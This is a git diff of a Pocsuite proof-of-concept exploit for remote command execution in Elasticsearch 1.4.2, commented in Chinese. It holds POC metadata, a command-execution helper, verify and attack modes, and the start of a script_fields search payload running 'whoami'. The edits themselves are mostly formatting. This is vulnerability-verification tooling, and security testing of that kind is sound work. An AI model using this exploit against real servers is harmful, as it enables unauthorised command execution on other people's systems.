@@ -6,7 +6,7 @@ import random
 import string
 from collections import OrderedDict
 import re
-from pocsuite.api.request import req  # 用法和 requests 完全相同
+from pocsuite.api.request import req  #用法和 requests 完全相同
 from pocsuite.api.poc import register
 from pocsuite.api.poc import Output, POCBase
 
@@ -14,9 +14,9 @@ from pocsuite.api.poc import Output, POCBase
 class TestPOC(POCBase):
     PocName = 'elasticsearch_exec '
     vulID = '1'  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
-    version = '1'  # 默认为1
-    author = 'lyb'  # PoC作者的大名
-    vulDate = '2018/5/24'  # 漏洞公开的时间,不知道就写今天
+    version = '1'  #默认为1
+    author = 'lyb'  #  PoC作者的大名
+    vulDate = '2018/5/24'  #漏洞公开的时间,不知道就写今天
     createDate = '2018/5/24'  # 编写 PoC 的日期
     updateDate = '2018/5/24'  # PoC 更新的时间,默认和编写时间一样
     references = [
@@ -25,12 +25,14 @@ class TestPOC(POCBase):
     appPowerLink = 'elasticsearch'  # 漏洞厂商主页地址
     appName = 'elasticsearch'  # 漏洞应用名称
     appVersion = '1.4.2'  # 漏洞影响版本
-    vulType = 'Command Execution'  # 漏洞类型,类型参考见 漏洞类型规范表
-    desc = 'elasticsearch命令执行。'  # 漏洞简要描述
+    vulType = 'Command Execution'  #漏洞类型,类型参考见 漏洞类型规范表
+    desc = '''
+        elasticsearch命令执行。
+    '''  # 漏洞简要描述
     samples = []  # 测试样列,就是用 PoC 测试成功的网站
     install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
 
-    def _elastic(self, url, cmd):
+    def _elastic(self,url,cmd):
         """
         Elastic search 命令执行函数
         漏洞详情:http://zone.wooyun.org/content/18915
@@ -50,7 +52,6 @@ class TestPOC(POCBase):
         if result:
             results.append(result[0])
         return results
-
     def _attack(self):
         '''attack mode'''
         return self._verify()
@@ -58,7 +59,7 @@ class TestPOC(POCBase):
     def _verify(self):
         '''verify mode'''
         result = {}
-        cmd = "whoami"
+        cmd="whoami"
         if self.url[-1] != '/': self.url += '/'
         elastic_url = self.url + '_search?pretty'
         exp = '{"size":1,"script_fields": ' \
